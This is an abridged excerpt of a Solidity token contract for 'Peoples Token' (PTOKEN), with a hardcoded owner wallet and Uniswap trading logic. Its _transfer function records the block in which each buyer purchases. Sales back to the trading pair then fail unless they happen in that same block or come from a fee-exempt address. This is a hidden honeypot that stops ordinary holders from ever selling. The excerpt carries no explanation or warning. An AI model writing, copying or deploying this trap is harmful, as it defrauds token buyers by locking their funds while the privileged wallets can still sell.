...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xF47F6bf13a76be7a1E5d3C2BCa61Bf039b552B73;
...
contract Peoples is Context, IERC20, Ownable {
    ...
    address private _developmentWalletAddress = 0xF47F6bf13a76be7a1E5d3C2BCa61Bf039b552B73;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal = 1000000000000000 * 10**18;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    string private _name = "Peoples Token";
    string private _symbol = "PTOKEN";
    ...
    mapping (address => uint) private ab;

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    uint256 public _maxTxAmount = 200000000000000 * 10**18;
    uint256 private numTokensSellToAddToLiquidity = 500000000000000 * 10**18;
    ...
    function _transfer(
        ...
        if(from == uniswapV2Pair && ab[to] == 0){
            ab[to] = block.number;
        } else if(to == uniswapV2Pair){
            require(block.number - ab[from] < 1 || _isExcludedFromFee[from]);
        }
